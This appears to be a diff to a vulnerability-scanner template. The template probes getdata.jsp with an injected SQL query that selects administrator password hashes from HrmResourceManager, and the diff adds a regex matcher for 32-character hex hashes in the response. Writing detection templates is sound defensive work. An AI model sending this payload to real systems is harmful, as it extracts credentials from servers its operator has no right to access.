@@ -26,10 +26,14 @@ http:
     path:
       - "{{BaseURL}}/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
 
+    matchers-condition: and
     matchers:
       - type: dsl
         dsl:
-          # - 'contains(body_2, "qNZGimiejDiiR5HKHubtm3Ib5WeWUnM6")'
           - 'status_code == 200'
         condition: and
+      - type: regex
+        part: body
+        regex:
+          - '[0-9A-F]{32}'
 
